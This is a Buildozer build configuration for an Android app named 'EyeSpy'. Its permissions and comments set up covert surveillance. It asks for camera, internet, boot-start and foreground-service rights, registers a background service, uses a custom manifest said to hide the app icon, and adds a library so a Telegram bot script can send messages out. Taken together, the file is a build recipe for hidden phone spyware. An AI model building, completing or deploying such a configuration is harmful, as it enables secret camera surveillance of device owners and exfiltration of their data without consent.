[app]

# (str) Title of your application
title = EyeSpy

# (str) Package name
package.name = eyespy

# (str) Package domain (needed for android packaging)
package.domain = org.eyespy

# (str) Source files where the *.py may be found
source.dir = .

# (list) Source files to include (let it catch python files, keys, etc.)
source.include_exts = py,png,jpg,kv,atlas,xml

# (str) Application versioning
version = 0.1

# (list) Application requirements
# Added 'requests' so your Telegram bot script can send messages!
requirements = python3,kivy,openssl,requests,urllib3,idna,charset-normalizer,certifi

# (str) Supported orientations
orientation = portrait

# (list) Permissions
android.permissions = CAMERA,INTERNET,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE

# (int) Target Android API, should be as high as possible.
android.api = 33

# (int) Minimum API your APK will support
android.minapi = 21

# (bool) Indicate if you accept the SDK license
android.accept_sdk_license = True

# (list) Arctitectures - set to universal so it works on all devices
android.archs = arm64-v8a, armeabi-v7a

# --- Background & Stealth Settings ---
# Registers your background script
services = eyespy_service:service.py

# Points to your custom manifest that hides the app icon
android.manifest_template = android_manifest.xml

[buildozer]

# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
log_level = 2

# (int) Display warning if buildozer is run as root (0 = False, 1 = True)
warn_on_root = 1
